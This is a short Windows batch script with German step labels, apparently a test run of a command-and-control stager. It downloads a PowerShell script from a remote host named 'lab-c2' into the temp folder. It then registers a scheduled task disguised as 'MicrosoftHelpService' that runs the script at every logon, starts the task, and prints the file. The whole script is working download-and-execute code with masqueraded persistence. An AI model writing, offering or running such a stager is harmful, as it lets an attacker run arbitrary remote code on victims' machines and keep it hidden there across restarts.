@echo off
set PS1=%TEMP%\winhelper.ps1
echo Schritt 1: Download...
powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing"
echo Download: %errorlevel%

echo Schritt 2: Task anlegen...
schtasks /create /tn "MicrosoftHelpService" /tr "powershell -NonInteractive -File \"%PS1%\"" /sc onlogon /ru %USERNAME% /f
echo Task create: %errorlevel%

echo Schritt 3: Task starten...
schtasks /run /tn "MicrosoftHelpService"
echo Task run: %errorlevel%

echo Schritt 4: PS1 Inhalt:
type "%PS1%"
pause
